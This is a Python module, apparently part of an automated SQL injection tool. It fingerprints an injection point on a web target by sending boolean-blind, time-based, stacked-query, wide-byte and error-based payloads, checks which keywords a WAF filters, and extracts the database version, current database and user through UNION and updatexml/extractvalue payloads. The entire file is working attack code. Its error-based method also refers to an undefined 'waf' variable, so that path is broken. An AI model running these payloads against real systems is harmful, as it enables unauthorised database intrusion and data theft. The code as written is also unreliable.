"""注入类型识别：回显 / 报错 / 布尔 / 时间 / 堆叠 / 宽字节 + 版本探测。"""
from __future__ import annotations

import re
from typing import Optional

from .models import Fingerprint, InjectionPoint, ResponseInfo, similarity
from .session import HttpSession


class Fingerprinter:
    def __init__(self, session: HttpSession, injection: InjectionPoint,
                 R_err: Optional[ResponseInfo] = None):
        self.s = session
        self.inj = injection
        self.log = session.log
        self.R_err = R_err

    def _pre(self) -> str:
        return self.inj.base_value if self.inj.numeric \
            else self.inj.base_value + self.inj.closure

    def _tail(self) -> str:
        return self.inj.comment if self.inj.comment != "quote-close" else ""

    def run(self, waf) -> Fingerprint:
        fp = Fingerprint()
        fp.error_visible = bool(self.R_err and self.R_err.has_sql_error())
        fp.echo_visible = bool(self.inj.echo_positions)
        notes = []

        # 布尔盲注
        if not waf.is_filtered("and"):
            t = self.s.request_value(f"{self._pre()} and 1=1{self._tail()}")
            f = self.s.request_value(f"{self._pre()} and 1=2{self._tail()}")
            fp.boolean_oracle = (t.status_code > 0 and
                                 (similarity(t, f) < 0.995 or t.status_code != f.status_code))
        elif not waf.is_filtered("or"):
            t = self.s.request_value(f"{self._pre()} or 1=1{self._tail()}")
            f = self.s.request_value(f"{self._pre()} or 1=2{self._tail()}")
            fp.boolean_oracle = (t.status_code > 0 and similarity(t, f) < 0.995)
        else:
            notes.append("and/or 均被过滤，布尔盲注判定受限")

        # 时间盲注
        if not waf.is_filtered("sleep") and not waf.is_filtered("and"):
            r = self.s.request_value(f"{self._pre()} and sleep(3){self._tail()}")
            fp.time_oracle = r.elapsed_ms >= 2800
        elif not waf.is_filtered("sleep"):
            r = self.s.request_value(f"{self._pre()}||sleep(3){self._tail()}")
            fp.time_oracle = r.elapsed_ms >= 2800
        else:
            notes.append("sleep 或 and 被过滤，时间盲注判定受限")

        # 堆叠
        if not waf.is_filtered(";") and not waf.is_filtered("select"):
            r = self.s.request_value(f"{self._pre()};select sleep(3){self._tail()}")
            fp.stacked = r.elapsed_ms >= 2800 and not r.has_sql_error()
            if fp.stacked:
                notes.append("堆叠注入可用（mysqli_multi_query）")
        else:
            notes.append("分号或 select 被过滤，堆叠判定受限")

        # 宽字节（引号被处理的场景才有意义）
        if waf.is_filtered("'"):
            r = self.s.request_value(self.inj.base_value + "\xdf'")
            fp.widebyte = r.has_sql_error() or (
                self.R_err is not None and similarity(r, self.R_err) > 0.95)
            if fp.widebyte:
                notes.append("宽字节注入可行（%df 吞掉转义反斜杠）")

        # 版本 / 当前库（快速通道：union 回显 > 报错）
        if fp.echo_visible and not waf.is_filtered("union", "select"):
            self._version_via_union(fp)
        elif fp.error_visible and not waf.is_filtered("updatexml", "extractvalue"):
            self._version_via_error(fp)

        for n in notes:
            self.log("INFO", f"[指纹] {n}")
        self.log("INFO", f"[指纹] {fp.to_dict()}")
        return fp

    # ------------------------------------------------------------------
    def _version_via_union(self, fp: Fingerprint):
        n = self.inj.column_count or 2
        cols = ["null"] * n
        pos = (self.inj.echo_positions or [1])[0] - 1
        cols[pos] = "concat_ws(0x7e,version(),database(),user())"
        r = self.s.request_value(
            f"0{self.inj.closure} union select {','.join(cols)}{self.inj.comment}")
        m = re.search(r"([0-9]+\.[0-9]+\.[0-9]+[^\s~]*)~([^~\s<]+)~([^\s~<]+)", r.body)
        if m:
            fp.version, fp.current_db, fp.current_user = m.group(1), m.group(2), m.group(3)

    def _version_via_error(self, fp: Fingerprint):
        fn = "updatexml" if not waf.is_filtered("updatexml") else "extractvalue"
        # waf 在闭包参数中不可用时的兜底：直接构造
        payload = (f"{self._pre()} and {fn}(1,concat(0x7e,version(),0x7e),1)"
                   f"{self._tail() if fn == 'updatexml' else ''}")
        if fn == "extractvalue":
            payload = f"{self._pre()} and extractvalue(1,concat(0x7e,version(),0x7e)){self._tail()}"
        r = self.s.request_value(payload)
        m = re.search(r"XPATH syntax error:\s*'~?([^~']+)", r.body)
        if m:
            fp.version = m.group(1)
